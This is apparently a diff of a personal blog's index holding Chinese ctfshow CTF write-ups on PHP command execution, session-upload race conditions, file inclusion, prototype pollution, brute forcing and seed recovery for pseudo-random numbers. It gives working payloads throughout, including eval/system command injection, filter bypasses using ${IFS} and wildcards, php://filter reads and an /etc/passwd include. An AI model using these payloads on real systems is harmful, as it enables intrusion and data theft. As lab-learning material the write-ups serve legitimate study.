-<p>if(isset($_GET[‘c’])){：isset()函数用于检查变量是否已设置且非null。这里是检查$_GET超全局数组中是否存在键为’c’的元素。如果存在，就执行下面的代码块。</p>
-<p>$c = $_GET[‘c’];：将$_GET[‘c’]的值赋给变量$c，以便后续使用。</p>
-<p>if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配。这里的正则表达式&quot;/flag/i&quot;表示不区分大小写地匹配字符串&quot;flag&quot;。!表示取反，即如果$c的值不包含（不区分大小写）“flag”，则执行下面的eval($c);语句。</p>
-<p>eval($c);：eval()函数会将传入的字符串作为 PHP 代码执行。这是一个非常强大但也很危险的函数，因为如果传入的字符串来自不可信的来源（例如用户输入），可能会导致安全漏洞，如代码注入攻击。</p>
-<p>总的来说：我们需要get一个命令，让它出现flag。然而，他又过滤了flag这四个字符，那怎么办？</p>
-<p>\1. 使用Linux通配符，我们可以这样构造payload：?c=system(‘cat f*’);或者?c=system(‘cat [f]*’);然后查看源码得到flag，或者抓包看到flag</p>
-<p>\2. ?c=system(“cat *.php&gt;&gt;1.txt”);把所有以php结尾的文件都写进一个txt</p>
-<p>ctfshow{cd997bb9-1ab7-48a7-819a-c5e9856aedc3}</p>
-<p>插入一点知识:</p>
-<p>\1.  ?c=phpinfo();当中的disable_functions</p>
-<p><img src="wps30.jpg" alt="img"></p>
-<p>后面没有任何的值，也就是说，这里没有禁用任何的函数。那么我们就可以使用system函数来输出flag</p>
-<p>\2.  ?c=system(‘ls’);看到有flag.php和index.php两个文件，那么我们想一想，能不能单独显示出来flag.php，然后前面加上一个cat？</p>
-<p>scandir(“.”)扫描当前目录，但没有回显</p>
-<p>套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
-<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
-<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
-<p>那么，有了flag.php这个整体，那前面拼接一个cat是不是就可以了？</p>
-<p>知识有限，止步于此</p>
-<h1>Web30</h1>
-<p>shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令</p>
-<p>反引号和shell_exec()函数同理</p>
-<p>?c=echo <code>cat f*</code>;看源码出flag</p>
-<p>?c=passthru(‘cat f*’);</p>
-<p>这里呢？哈哈哈哈，卢本伟：**</p>
-<p>万能办法&gt;&gt;和cp(复制，和&gt;&gt;差不多)用法cp flag.php 1.txt</p>
-<p>?c=echo <code>cat [f]*</code>;注意看源代码，你看你的软件，肯定没回显的</p>
-<p>?c=echo <code>cat [f]* &gt;&gt; 1.txt</code>;</p>
-<p>ctfshow{e6cce2cc-a5dc-4e88-ba65-3cc8d4620046}</p>
-<h1>总结21-30</h1>
-<p>1.bp当中的intruder为爆破部分</p>
-<p>2.自定义迭代器(Custom Iterator):可以自动替换测试，而且可以添加前后缀，结果可以通过base64等加密一下</p>
-<p>3.特定字符串内容一般abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789其中几个字符组成的，可以通过编写脚本得出需要的特定字符串</p>
-<p>4.伪随机数mt_srand()和mt_srand(seed);产生的随机数是固定的。seed为数字串</p>
-<p>5.intruder 当中有集束炸弹模式，可以选中多个部分进行爆破</p>
-<p>6.if(!preg_match(“/flag/i”, $c)){：preg_match()函数用于执行正则表达式匹配</p>
-<p>7.isset()函数用于检查变量是否已设置且非null。if(isset($_GET[‘c’])){</p>
-<p>8.eval()函数会将传入的字符串作为 PHP 代码执行</p>
-<p>9.error_reporting(0);这行代码用于关闭错误报告(和报错注入有关？我瞎猜的)</p>
-<p>10.Linux通配符:  cat * [] {} ?</p>
-<p>11.phpinfo();当中的disable_functions后面跟的值是禁用的函数</p>
-<p>12.?c=system(“cat *.php&gt;&gt;1.txt”);把所有php的内容写到txt里面</p>
-<p>13.scandir(“.”)表示扫描当前目录，一个点是当前目录，两个点是上级目录.套上一个print_r()函数就可以看到回显，最终?c=print_r(scandir(“.”));</p>
-<p>Array ( [0] =&gt; . [1] =&gt; … [2] =&gt; flag.php [3] =&gt; index.php )</p>
-<p>?c=print_r(scandir(“.”)[2]);输出flag.php</p>
-<p>那在前面拼接一个cat是不是可以拿到flag？</p>
-<p>14.shell_exec ()函数：shell_exec(‘ls -l’) 会执行 ls -l 系统命令.反引号和shell_exec()函数同理</p>
-<ol start="15">
-<li>?c=passthru(‘cat f*’);</li>
-</ol>
-<p>​		?c=echo cat [f]*;注意看源代码，你看你的软件，肯定没回显的</p>
-<p>​		?c=echo cat [f]* &gt;&gt; 1.txt;</p>
-<p>16.?c=eval($_GET[a]);&amp;a=system(‘cat flag.php’);</p>
-<p>代码解释：从get当中获取了一个超全局变量a，并使用eval函数将其作为php代码执行</p>
-<p>通过a来拿到flag，但这里似乎是在preg_match外运行的，不会受过滤的影响</p>
-<p>$符号可以类比java当中的int</p>
-<ol start="17">
-<li></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格绕过</span><br><span class="line"></span><br><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
-<ol start="18">
-<li></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat过滤</span><br><span class="line"></span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
-<p>19…</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php无需括号的函数</span><br><span class="line"></span><br><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
-<p>20.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
+    <title>test</title>
+    <url>/2025/04/14/test/</url>
+    <content><![CDATA[<p>123123123</p>
 ]]></content>
-      <tags>
-        <tag>ctfshow_web_命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web82-86竞争</title>
-    <url>/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/</url>
-    <content><![CDATA[<h1>web82</h1>
-<p>在cookie中设置PHPSESSID（即session 的值）=flag，那么会在服务器上创建一个/tmp/sess_flag文件，对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。<br>
-首先我们需要编写以下html脚本，进行临时文件上传，上传文件的同时传入一个参数及其值:PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls'); ?>，这样达到<a href="https://so.csdn.net/so/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;spm=1001.2101.3001.7020">恶意代码</a>的上传，进而执行命令。  注：记得修改url为你做题的网址</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://04485255-5dd1-4cb0-a34a-e59b3e194b81.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>文件随便上传一个</p>
-<p>发送到i(爆破)</p>
-<p>然后在Cookie后面添加PHPSESSID=flag,以生成sess_flag文件</p>
-<p><img src="image-20250125021609888.png" alt="image-20250125021609888"></p>
-<p>?file=/tmp/sess_flag</p>
-<p><img src="image-20250125020408645.png" alt="image-20250125020408645"></p>
-<p>不涉及爆破，需要清除$,点击上边的清除playload位置$</p>
-<p>如果无法清除，在最后一行加一个地方，选中空白即可</p>
-<p><img src="image-20250125020725543.png" alt="image-20250125020725543"></p>
-<p>此处设置 null payload 以及 无限重复</p>
-<p><img src="image-20250125020752186.png" alt="image-20250125020752186"></p>
-<p>新建一个资源池，设置线程为30</p>
-<p><img src="image-20250125020823707.png" alt="image-20250125020823707"></p>
-<p>点击开始，在后面点长度，我这是900接近一千的数字，在下面的响应里面有fl0g.php</p>
-<p><img src="image-20250125021716036.png" alt="image-20250125021716036"></p>
-<p>一边上传一边访问文件，由于访问文件比上传快，所以更能成功。</p>
-<p>可见长度与其他不同，点击查看回显结果，得到文件名：fl0g.php，更改命令，cat fl0g.php</p>
-<p><img src="image-20250125022131210.png" alt="image-20250125022131210"></p>
-<p>ctfshow{bd8c3428-76be-488f-b256-2caa6491ab85}</p>
-<h1>web83</h1>
-<p><img src="image-20250125022829690.png" alt="image-20250125022829690"></p>
-<p>我这web82的保存下来了</p>
-<p><img src="image-20250125022921448.png" alt="image-20250125022921448"></p>
-<p><img src="image-20250125022936154.png" alt="image-20250125022936154"></p>
-<p><img src="image-20250125022950921.png" alt="image-20250125022950921"></p>
-<h1>web84</h1>
-<p>直接写最后一步了，虽然源码变了奥，但是还是能拿flag</p>
-<p><img src="image-20250125023653322.png" alt="image-20250125023653322"></p>
-<h1>web85</h1>
-<p><img src="image-20250125024026566.png" alt="image-20250125024026566"></p>
-<h1>web86</h1>
-<p><img src="image-20250125025211879.png" alt="image-20250125025211879"></p>
-]]></content>
-      <tags>
-        <tag>web竞争</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>原型链污染</title>
-    <url>/2025/03/16/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
-    <content><![CDATA[<p>似乎与ssti有相似的地方。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;pan&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">19</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="keyword">if</span>(b.<span class="property">__proto__</span> == a.<span class="property"><span class="keyword">prototype</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;yes&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果为yes</span></span><br></pre></td></tr></table></figure>
-<h2 id="什么是原型链？">什么是原型链？</h2>
-<p>因为继承机制而产生的线性关系</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">[Object: null prototype] &#123;&#125;</span></span><br><span class="line"><span class="comment">null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<p>var的上层为{}，再上层就是Object，再往上就是null。null为链的末端。</p>
-<h2 id="继承机制">继承机制</h2>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;ssz1&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;ssz2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置b的父类为a</span></span><br><span class="line">b.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义c对象</span></span><br><span class="line">c = <span class="keyword">new</span> b;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name:<span class="subst">$&#123;c.name&#125;</span> age:<span class="subst">$&#123;c.age&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">name:ssz2 age:18</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<h2 id="看一个经典的递归漏洞思路">看一个经典的递归漏洞思路</h2>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">//要实现从JSON字符串转换为JS对象，使用 JSON.parse() 方法</span></span><br><span class="line"><span class="comment">//代码中的 __proto__ 是 o1 的上一层原型对象</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<p>merge(合并)函数解释：用于将source对象的属性合并到target对象中。如果属性是对象，则递归合并，否则直接覆盖或添加属性到target。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let target = &#123; a: 1, b: &#123; x: 2 &#125; &#125;;</span><br><span class="line">let source = &#123; b: &#123; y: 3 &#125;, c: 4 &#125;;</span><br><span class="line">merge(target, source); </span><br><span class="line">// 结果：&#123; a:1, b:&#123;x:2, y:3&#125;, c:4 &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://zhuanlan.zhihu.com/p/690650551">原文</a></p>
-<p><a href="https://xz.aliyun.com/news/12518?time__1311=eqUxu7DtD%3DTND%2FD0Dd%3DitG8RACuWoD&amp;u_atoken=0d51e5d3cd115a0d879fb72d56b21eb7&amp;u_asig=0a47309317419553385443514e0086">python原型链污染</a></p>
-]]></content>
-      <tags>
-        <tag>原型链污染</tag>
-      </tags>
   </entry>
   <entry>
     <title>web31-命令执行结束</title>
@@ -2419,11 +2177,247 @@ preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变�
       </tags>
   </entry>
   <entry>
-    <title>搞砸了</title>
-    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
-    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
-<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
+    <title>web82-86竞争</title>
+    <url>/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/</url>
+    <content><![CDATA[<h1>web82</h1>
+<p>在cookie中设置PHPSESSID（即session 的值）=flag，那么会在服务器上创建一个/tmp/sess_flag文件，对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。<br>
+首先我们需要编写以下html脚本，进行临时文件上传，上传文件的同时传入一个参数及其值:PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls'); ?>，这样达到<a href="https://so.csdn.net/so/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;spm=1001.2101.3001.7020">恶意代码</a>的上传，进而执行命令。  注：记得修改url为你做题的网址</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://04485255-5dd1-4cb0-a34a-e59b3e194b81.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>文件随便上传一个</p>
+<p>发送到i(爆破)</p>
+<p>然后在Cookie后面添加PHPSESSID=flag,以生成sess_flag文件</p>
+<p><img src="image-20250125021609888.png" alt="image-20250125021609888"></p>
+<p>?file=/tmp/sess_flag</p>
+<p><img src="image-20250125020408645.png" alt="image-20250125020408645"></p>
+<p>不涉及爆破，需要清除$,点击上边的清除playload位置$</p>
+<p>如果无法清除，在最后一行加一个地方，选中空白即可</p>
+<p><img src="image-20250125020725543.png" alt="image-20250125020725543"></p>
+<p>此处设置 null payload 以及 无限重复</p>
+<p><img src="image-20250125020752186.png" alt="image-20250125020752186"></p>
+<p>新建一个资源池，设置线程为30</p>
+<p><img src="image-20250125020823707.png" alt="image-20250125020823707"></p>
+<p>点击开始，在后面点长度，我这是900接近一千的数字，在下面的响应里面有fl0g.php</p>
+<p><img src="image-20250125021716036.png" alt="image-20250125021716036"></p>
+<p>一边上传一边访问文件，由于访问文件比上传快，所以更能成功。</p>
+<p>可见长度与其他不同，点击查看回显结果，得到文件名：fl0g.php，更改命令，cat fl0g.php</p>
+<p><img src="image-20250125022131210.png" alt="image-20250125022131210"></p>
+<p>ctfshow{bd8c3428-76be-488f-b256-2caa6491ab85}</p>
+<h1>web83</h1>
+<p><img src="image-20250125022829690.png" alt="image-20250125022829690"></p>
+<p>我这web82的保存下来了</p>
+<p><img src="image-20250125022921448.png" alt="image-20250125022921448"></p>
+<p><img src="image-20250125022936154.png" alt="image-20250125022936154"></p>
+<p><img src="image-20250125022950921.png" alt="image-20250125022950921"></p>
+<h1>web84</h1>
+<p>直接写最后一步了，虽然源码变了奥，但是还是能拿flag</p>
+<p><img src="image-20250125023653322.png" alt="image-20250125023653322"></p>
+<h1>web85</h1>
+<p><img src="image-20250125024026566.png" alt="image-20250125024026566"></p>
+<h1>web86</h1>
+<p><img src="image-20250125025211879.png" alt="image-20250125025211879"></p>
 ]]></content>
+      <tags>
+        <tag>web竞争</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web21-30</title>
+    <url>/2025/01/19/web21-30/</url>
+    <content><![CDATA[<h1><strong>Web21</strong></h1>
+<p>有一点真麻烦</p>
+<img src="image-20250119202523975.png" alt="image-20250119202523975" style="zoom:25%;">
+<p>Bp抓包</p>
+<p>发送给intruder</p>
+<p>添加账号密码哪里</p>
+<p><img src="wps12.jpg" alt="img"></p>
+<p>用自定义迭代器(Custom Iterator)</p>
+<p>payload配置当中</p>
+<p>位置1添加admin</p>
+<p><img src="wps13.jpg" alt="img"></p>
+<p>位置2添加英文冒号</p>
+<p><img src="wps14.jpg" alt="img"></p>
+<p>位置3添加下载的附件</p>
+<p><img src="wps15.jpg" alt="img"></p>
+<p>Payload处理当中选择</p>
+<p><img src="wps16.jpg" alt="img"></p>
+<p>对我们添加的东西进行base64加密</p>
+<p>关闭对勾</p>
+<p><img src="wps17.jpg" alt="img"></p>
+<p>开始破解</p>
+<p>点击状态码</p>
+<p><img src="wps18.jpg" alt="img"></p>
+<p>第一个就是账号和密码</p>
+<p>解码出来是</p>
+<p><img src="wps19.jpg" alt="img"></p>
+<p>admin:shark63</p>
+<p>ctfshow{fb4fe60a-bc16-4982-92df-439262c04233}</p>
+<h1><strong>Web22</strong></h1>
+<p>没有靶机，自行wp</p>
+<h1><strong>Web23</strong></h1>
+<p><img src="wps20.jpg" alt="img"></p>
+<p>根据源码可知，需要token为特定的值才可以得到flag</p>
+<p>Token里面应该是abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</p>
+<p>当中任意的几个的结合体</p>
+<p>Wp里面假设了三个，php脚本为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line"></span><br><span class="line">print (strlen($string).&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for ($a = 0; $a &lt; 62; $a++) &#123;</span><br><span class="line"></span><br><span class="line">  for ($b = 0; $b &lt; 62; $b++) &#123;</span><br><span class="line"></span><br><span class="line">​    for ($c = 0; $c &lt; 62; $c++) &#123;</span><br><span class="line"></span><br><span class="line">​      $flag = $string[$a] . $string[$b] . $string[$c];</span><br><span class="line"></span><br><span class="line">​      $token = md5($flag);</span><br><span class="line"></span><br><span class="line">​      if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) &#123;</span><br><span class="line"></span><br><span class="line">​        if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) &#123;</span><br><span class="line"></span><br><span class="line">​          echo $flag . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>答案有很多个a6e就是其中一个</p>
+<p>但是也可以是2位的token</p>
+<p>使用bp暴力破解出现3j</p>
+<p><img src="wps21.jpg" alt="img"></p>
+<p>这里要点击length</p>
+<p><img src="wps22.jpg" alt="img"></p>
+<p>同理用bp破解三位数也一样，但是四位数就比较耗费时间了，毕竟是暴力破解嘛</p>
+<p><img src="wps23.jpg" alt="img"></p>
+<p>ctfshow{83a47257-9025-4ea9-acb8-f7d5cbe4d541}</p>
+<h1><strong>Web24</strong></h1>
+<p>知识：伪随机数</p>
+<p>我们先了解一下怎样生成随机数</p>
+<?php
+
+  echo intval(mt_rand());
+
+?>
+<p>Intval()函数，将浮点数、布尔值转化为整数或0、1</p>
+<p>mt_rand()函数，会根据系统时间或者其他东西来产生随机数</p>
+<p>在本题中出现了mt_srand()函数mt_srand(372619038);</p>
+<p>其中的数字是seed种子，一旦使用了此函数，在之后的mt_rand()函数将基于该种子生成随机数，如果这里的种子不变，那么生成的随机数也会固定不变（因为生成随机数的算法不会变）</p>
+<p>那么我们通过运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?Php</span><br><span class="line"></span><br><span class="line">  mt_srand(372619038);</span><br><span class="line"></span><br><span class="line">  echo intval(mt_rand());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到的数字1155388967就可以拿到flag</p>
+<p>ctfshow{dddab7e5-2562-455d-9156-17542fe2507a}</p>
+<h1><strong>Web25</strong></h1>
+<p>$rand = intval($r)-intval(mt_rand());</p>
+<p>当r=0时</p>
+<p>Rand=-448251818</p>
+<p>那么，mt_rand=448251818</p>
+<p>这里需要反推出seed，下载php_mt_seed，拖进去ubuntu。对了，还需要php的版本，我们抓包看看响应头  PHP/7.3.11</p>
+<p>在ubuntu运行脚本查看seed：928309670或者4126709391</p>
+<p>在这里面运行（后一个seed正确）</p>
